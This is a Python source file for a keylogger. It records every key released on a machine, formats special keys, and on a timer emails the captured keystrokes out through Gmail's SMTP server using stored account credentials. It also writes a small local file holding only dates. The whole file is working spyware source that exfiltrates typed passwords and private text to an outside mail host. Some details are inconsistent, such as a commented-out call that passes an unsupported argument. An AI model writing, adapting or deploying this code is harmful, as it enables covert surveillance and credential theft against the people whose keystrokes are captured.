import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
import Constant #for having variables that can't be changed
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = "Log Date Information"


    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        elif len(name) == 0:
            name = "No input in past 60 seconds. GripWindow."
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        dates = "Start: "+start_dt_str + "\nEnd: "+end_dt_str + "\n"
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(dates, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.end_dt = datetime.now()
            # if there is something in log, report it
            self.sendmail(Constant.e_address, Constant.password, self.log)
            self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()


        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    # if you want a keylogger to send to your email
    keylogger = Keylogger(interval=Constant.inTerval)
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
